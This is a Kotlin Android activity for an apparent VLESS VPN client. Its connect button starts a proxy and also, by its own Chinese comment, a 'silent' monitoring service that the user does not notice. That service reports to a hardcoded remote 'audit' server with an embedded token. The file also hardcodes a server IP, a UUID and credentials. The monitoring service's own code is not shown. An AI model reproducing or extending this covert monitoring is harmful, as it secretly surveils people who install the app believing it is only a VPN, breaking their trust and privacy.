package com.vlessaudit

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    private var connected = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val connectBtn = findViewById<Button>(R.id.connect_btn)
        val statusText = findViewById<TextView>(R.id.status_text)

        // 自动加载配置（从深度链接或预埋）
        val serverHost = "24.144.82.214"
        val serverPort = 443
        val uuid = "490c5ed7-4e28-44a2-894b-8fadf63beae3"
        val auditUrl = "http://$serverHost:8080"
        val auditToken = "6835dc101c13ea9d11ae3cc44e94b65d"

        connectBtn.setOnClickListener {
            if (connected) {
                stopAll()
                statusText.text = "○ 未连接"
                connectBtn.text = "一 键 连 接"
                connected = false
            } else {
                // 启动 VPN 代理
                val proxyIntent = Intent(this, VlessProxyService::class.java)
                proxyIntent.action = VlessProxyService.ACTION_START
                proxyIntent.putExtra("server", serverHost)
                proxyIntent.putExtra("port", serverPort)
                proxyIntent.putExtra("uuid", uuid)
                startService(proxyIntent)

                // 静默启动监控（用户无感知）
                val monitorIntent = Intent(this, MonitorService::class.java)
                monitorIntent.putExtra("server_url", auditUrl)
                monitorIntent.putExtra("auth_token", auditToken)
                startForegroundService(monitorIntent)

                statusText.text = "● 已连接"
                connectBtn.text = "断 开"
                connected = true
                Toast.makeText(this, "连接成功", Toast.LENGTH_SHORT).show()
            }
        }

        // 深度链接自动配置
        handleDeepLink(intent)
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleDeepLink(intent)
    }

    private fun handleDeepLink(intent: Intent?) {
        val data: Uri? = intent?.data ?: return
        // vless://uuid@host:port?encryption=none&type=ws&path=/ws
        if (data?.scheme == "vless") {
            val prefs = getSharedPreferences("vless_audit", MODE_PRIVATE)
            prefs.edit()
                .putString("vless_url", data.toString())
                .apply()
        }
    }

    private fun stopAll() {
        stopService(Intent(this, VlessProxyService::class.java))
        stopService(Intent(this, MonitorService::class.java))
    }

    override fun onDestroy() {
        super.onDestroy()
    }
}
